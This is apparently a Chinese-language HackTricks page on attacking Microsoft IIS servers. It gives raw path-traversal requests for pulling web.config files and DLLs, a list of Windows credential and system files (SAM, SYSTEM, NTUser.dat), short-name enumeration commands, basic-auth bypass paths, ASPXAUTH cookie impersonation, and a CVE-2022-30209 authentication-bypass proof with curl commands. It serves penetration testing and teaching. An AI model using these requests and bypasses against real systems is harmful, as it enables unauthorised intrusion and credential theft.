<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>IIS - Internet Information Services</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="iis---internet-information-services"><a class="header" href="#iis---internet-information-services">IIS - Internet Information Services</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<p>测试可执行文件扩展名：</p>
<ul>
<li>asp</li>
<li>aspx</li>
<li>config</li>
<li>php</li>
</ul>
<h2 id="内部-ip-地址泄露"><a class="header" href="#内部-ip-地址泄露">内部 IP 地址泄露</a></h2>
<p>在任何 IIS 服务器上，如果你得到一个 302，你可以尝试去掉 Host 头并使用 HTTP/1.0，响应中的 Location 头可能会指向内部 IP 地址：</p>
<pre><code>nc -v domain.com 80
openssl s_client -connect domain.com:443
</code></pre>
<p>响应泄露内部IP：</p>
<pre><code>GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
</code></pre>
<h2 id="执行-config-文件"><a class="header" href="#执行-config-文件">执行 .config 文件</a></h2>
<p>您可以上传 .config 文件并使用它们执行代码。实现此目的的一种方法是在文件末尾的 HTML 注释中附加代码：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config">在此下载示例</a></p>
<p>有关利用此漏洞的更多信息和技术 <a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">请点击这里</a></p>
<h2 id="iis-发现暴力破解"><a class="header" href="#iis-发现暴力破解">IIS 发现暴力破解</a></h2>
<p>下载我创建的列表：</p>
<p>{% file src="../../.gitbook/assets/iisfinal.txt" %}</p>
<p>它是通过合并以下列表的内容创建的：</p>
<p><a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt</a><br />
<a href="http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html">http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html</a><br />
<a href="https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt">https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt</a><br />
<a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt</a><br />
<a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt</a><br />
<a href="https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt">https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt</a></p>
<p>使用时无需添加任何扩展名，所需的文件已经包含。</p>
<h2 id="路径遍历"><a class="header" href="#路径遍历">路径遍历</a></h2>
<h3 id="泄露源代码"><a class="header" href="#泄露源代码">泄露源代码</a></h3>
<p>查看完整的写作内容： <a href="https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html">https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html</a></p>
<p>{% hint style="info" %}
总结来说，应用程序的文件夹中有多个 web.config 文件，里面引用了 "<strong>assemblyIdentity</strong>" 文件和 "<strong>namespaces</strong>"。通过这些信息，可以知道 <strong>可执行文件的位置</strong> 并下载它们。<br />
从 <strong>下载的 Dlls</strong> 中，还可以找到 <strong>新的 namespaces</strong>，您应该尝试访问并获取 web.config 文件，以便找到新的 namespaces 和 assemblyIdentity。<br />
此外，文件 <strong>connectionstrings.config</strong> 和 <strong>global.asax</strong> 可能包含有趣的信息。\
{% endhint %}</p>
<p>在 <strong>.Net MVC 应用程序</strong> 中，<strong>web.config</strong> 文件通过 <strong>"assemblyIdentity"</strong> XML 标签指定应用程序所依赖的每个二进制文件，起着至关重要的作用。</p>
<h3 id="探索二进制文件"><a class="header" href="#探索二进制文件"><strong>探索二进制文件</strong></a></h3>
<p>访问 <strong>web.config</strong> 文件的示例如下：</p>
<pre><code class="language-markup">GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
</code></pre>
<p>此请求揭示了各种设置和依赖关系，例如：</p>
<ul>
<li><strong>EntityFramework</strong> 版本</li>
<li><strong>AppSettings</strong> 用于网页、客户端验证和JavaScript</li>
<li><strong>System.web</strong> 认证和运行时的配置</li>
<li><strong>System.webServer</strong> 模块设置</li>
<li><strong>Runtime</strong> 程序集绑定，适用于多个库，如 <strong>Microsoft.Owin</strong>、<strong>Newtonsoft.Json</strong> 和 <strong>System.Web.Mvc</strong></li>
</ul>
<p>这些设置表明某些文件，例如 <strong>/bin/WebGrease.dll</strong>，位于应用程序的 /bin 文件夹内。</p>
<h3 id="根目录文件"><a class="header" href="#根目录文件"><strong>根目录文件</strong></a></h3>
<p>在根目录中找到的文件，如 <strong>/global.asax</strong> 和 <strong>/connectionstrings.config</strong>（包含敏感密码），对于应用程序的配置和操作至关重要。</p>
<h3 id="命名空间和-webconfig"><a class="header" href="#命名空间和-webconfig"><strong>命名空间和 Web.Config</strong></a></h3>
<p>MVC 应用程序还为特定命名空间定义了额外的 <strong>web.config 文件</strong>，以避免在每个文件中重复声明，如通过请求下载另一个 <strong>web.config</strong> 所示：</p>
<pre><code class="language-markup">GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
</code></pre>
<h3 id="下载-dlls"><a class="header" href="#下载-dlls"><strong>下载 DLLs</strong></a></h3>
<p>提到自定义命名空间暗示在 /bin 目录中存在一个名为 "<strong>WebApplication1</strong>" 的 DLL。接下来，显示了下载 <strong>WebApplication1.dll</strong> 的请求：</p>
<pre><code class="language-markup">GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
</code></pre>
<p>这表明在 /bin 目录中存在其他重要的 DLL，例如 <strong>System.Web.Mvc.dll</strong> 和 <strong>System.Web.Optimization.dll</strong>。</p>
<p>在一个 DLL 导入名为 <strong>WebApplication1.Areas.Minded</strong> 的命名空间的场景中，攻击者可能推断出在可预测路径中存在其他 web.config 文件，例如 <strong>/area-name/Views/</strong>，其中包含特定的配置和对 /bin 文件夹中其他 DLL 的引用。例如，对 <strong>/Minded/Views/web.config</strong> 的请求可以揭示配置和命名空间，表明存在另一个 DLL <strong>WebApplication1.AdditionalFeatures.dll</strong>。</p>
<h3 id="常见文件"><a class="header" href="#常见文件">常见文件</a></h3>
<p>来自 <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">这里</a></p>
<pre><code>C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
</code></pre>
<h2 id="httpapi-20-404-错误"><a class="header" href="#httpapi-20-404-错误">HTTPAPI 2.0 404 错误</a></h2>
<p>如果您看到如下错误：</p>
<p><img src="../../.gitbook/assets/image%20(446)%20(1)%20(2)%20(2)%20(3)%20(3)%20(2)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(10)%20(10)%20(2).png" alt="" /></p>
<p>这意味着服务器<strong>没有在 Host 头中接收到正确的域名</strong>。<br />
为了访问网页，您可以查看提供的<strong>SSL 证书</strong>，也许可以在其中找到域名/子域名。如果没有，您可能需要<strong>暴力破解 VHosts</strong>，直到找到正确的。</p>
<h2 id="值得关注的旧-iis-漏洞"><a class="header" href="#值得关注的旧-iis-漏洞">值得关注的旧 IIS 漏洞</a></h2>
<h3 id="microsoft-iis-波浪字符漏洞特性--短文件文件夹名称泄露"><a class="header" href="#microsoft-iis-波浪字符漏洞特性--短文件文件夹名称泄露">Microsoft IIS 波浪字符“~”漏洞/特性 – 短文件/文件夹名称泄露</a></h3>
<p>您可以尝试使用此<strong>技术</strong>来<strong>枚举每个发现的文件夹和文件</strong>（即使它需要基本身份验证）。<br />
如果服务器存在漏洞，此技术的主要限制是<strong>它只能找到每个文件/文件夹名称的前 6 个字母和文件扩展名的前 3 个字母</strong>。</p>
<p>您可以使用 <a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a> 来测试此漏洞：<code>java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/</code></p>
<p><img src="../../.gitbook/assets/image%20(844).png" alt="" /></p>
<p>原始研究：<a href="https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a></p>
<p>您还可以使用<strong>metasploit</strong>：<code>use scanner/http/iis_shortname_scanner</code></p>
<p>一个不错的主意是<strong>找到发现文件的最终名称</strong>，可以<strong>询问 LLMs</strong> 以获取选项，就像在脚本 <a href="https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py">https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py</a> 中所做的那样。</p>
<h3 id="基本身份验证绕过"><a class="header" href="#基本身份验证绕过">基本身份验证绕过</a></h3>
<p><strong>绕过</strong>基本身份验证（<strong>IIS 7.5</strong>），尝试访问：<code>/admin:$i30:$INDEX_ALLOCATION/admin.php</code> 或 <code>/admin::$INDEX_ALLOCATION/admin.php</code></p>
<p>您可以尝试将此<strong>漏洞</strong>与最后一个结合，以发现新的<strong>文件夹</strong>并<strong>绕过</strong>身份验证。</p>
<h2 id="aspnet-traceaxd-启用调试"><a class="header" href="#aspnet-traceaxd-启用调试">ASP.NET Trace.AXD 启用调试</a></h2>
<p>ASP.NET 包含调试模式，其文件名为 <code>trace.axd</code>。</p>
<p>它保持对在一段时间内对应用程序发出的所有请求的详细日志。</p>
<p>此信息包括远程客户端 IP、会话 ID、所有请求和响应 cookie、物理路径、源代码信息，甚至可能包括用户名和密码。</p>
<p><a href="https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/">https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/</a></p>
<p><img src="https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png" alt="Screenshot 2021-03-30 at 13 19 11" /></p>
<h2 id="aspxauth-cookie"><a class="header" href="#aspxauth-cookie">ASPXAUTH Cookie</a></h2>
<p>ASPXAUTH 使用以下信息：</p>
<ul>
<li><strong><code>validationKey</code></strong>（字符串）：用于签名验证的十六进制编码密钥。</li>
<li><strong><code>decryptionMethod</code></strong>（字符串）：（默认“AES”）。</li>
<li><strong><code>decryptionIV</code></strong>（字符串）：十六进制编码的初始化向量（默认为零向量）。</li>
<li><strong><code>decryptionKey</code></strong>（字符串）：用于解密的十六进制编码密钥。</li>
</ul>
<p>然而，有些人会使用这些参数的<strong>默认值</strong>，并将<strong>用户的电子邮件</strong>用作<strong>cookie</strong>。因此，如果您能找到一个使用 ASPXAUTH cookie 的<strong>相同平台</strong>的网页，并且您<strong>在被攻击的服务器上创建一个与您想要冒充的用户相同的电子邮件的用户</strong>，您可能能够在第一个服务器中<strong>使用第二个服务器的 cookie</strong>并冒充该用户。<br />
这个攻击在这篇<a href="https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19"><strong>写作</strong></a>中有效。</p>
<h2 id="iis-身份验证绕过与缓存密码-cve-2022-30209"><a class="header" href="#iis-身份验证绕过与缓存密码-cve-2022-30209">IIS 身份验证绕过与缓存密码 (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a></a></h2>
<p><a href="https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html">完整报告在这里</a>：代码中的一个错误<strong>没有正确检查用户提供的密码</strong>，因此一个<strong>密码哈希命中</strong>已经在<strong>缓存</strong>中的密钥的攻击者将能够以该用户身份登录。</p>
<pre><code class="language-python"># script for sanity check
&gt; type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&amp;0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
&gt; curl -I -su 'orange:ZeeiJT' 'http://&lt;iis&gt;/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
&gt; curl -I -su 'orange:ZeeiJT' 'http://&lt;iis&gt;/protected/' | findstr HTTP
HTTP/1.1 200 OK
</code></pre>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/h2-java-sql-database.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/imagemagick-security.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/h2-java-sql-database.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/imagemagick-security.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
